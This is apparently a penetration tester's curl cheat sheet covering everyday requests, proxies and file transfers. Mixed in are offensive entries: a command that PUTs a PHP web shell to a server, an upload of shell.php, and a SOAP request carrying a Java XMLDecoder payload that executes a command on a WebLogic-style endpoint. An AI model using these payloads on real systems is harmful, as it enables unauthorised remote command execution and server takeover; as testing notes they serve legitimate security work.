# curl

quick easy way to interact with http/s, ftp,scp,sftp  
**IMPORTANT** curl URL's need to be put in '' or else often no response this has to do with cli encoding

- GET a webpage
  ```
  # curl 'http://192.168.56.102/test/'
  ```

- POST with message body
  ```
  # curl -d "parm1=xxx" 'http://192.168.56.102/test/'
  ```

- POST with message body read from file
  ```
  # strip new lines
  curl --data "@/path/to/filename" http://...    

  # keep newlines
  curl --data-binary "@/path/to/filename" http://...
  ```

- PUT a file on a webserver (with PUT enabled)
  ```
  $ curl -X PUT -d '<?php echo shell_exec($_GET['cmd']);?>' http://192.168.56.102/test/shell1.php
  ```

- Add a header to GET
  ```
  $ curl -H "Authorization: Bearer ylSkZIjbdWybfsUQe9BqP0LH5Z" http://whatever.com
  ```

- HTTPS
  Need to add the `-k` flag to ignore insecure HTTPS connection
  
- Use a proxy
  ```
  $ curl --proxy http://127.0.0.1:8080 http://detectportal.firefox.co.za
  $ curl --proxy http://127.0.0.1:8080 https://curl.haxx.se/docs/httpscripting.html -k
  ```

- Check if folders have OPTIONS enabled to PUT, in order to upload a file. See WebDAV
  ```
  # curl -X OPTIONS http://192.168.56.102/test/ -vv
  ```

- Download a file
```
  $ curl -o output.file http://server.example.com/output.file
  $ curl -O http://server.example.com/output.file
```

- Upload file
  ```
  # curl -T shell.php http://192.168.56.102/test/shell1.php -0
  ```
  -0 to force the use of HTTP/1.0

- Download file from SSH Server
```
curl -u username sftp://server.example.com/file.txt
## ~ means your $HOME dir ##
curl -u vivek sftp://home1.cyberciti.biz/~/docs/resume.pdf
```




#### Others

```
curl -v --proxy http://127.0.0.1:8080 -d 'userID=trustwavetest&password=XXXXXXXXXX&struts.token.name=struts.token&struts.token=9U90K0G52P73JBUOMMI2IOXX192SO07R' http://172.22.25.38/cpscentre/auth/login.do
```

```
curl -v --proxy https://10.246.78.60:8080 -H "Content-Type: text/xml" -H "Accept-Encoding: gzip, deflate, compress" -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
	<soapenv:Header>
		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
			<java version="1.8.0_151" class="java.beans.XMLDecoder">
			<void class="java.lang.ProcessBuilder">
				<array class="java.lang.String" length="3">
				<void index = "0">
					<string>cmd</string>
				</void>
				<void index = "1">
					<string>/c</string>
				</void>
				<void index = "2">
					<string>ls</string>
				</void>
			</array>
			<void method="start"/>
			</void>
			</java>
			</work:WorkContext>
	</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>' http://{ip}/CoordinatorPortType
```
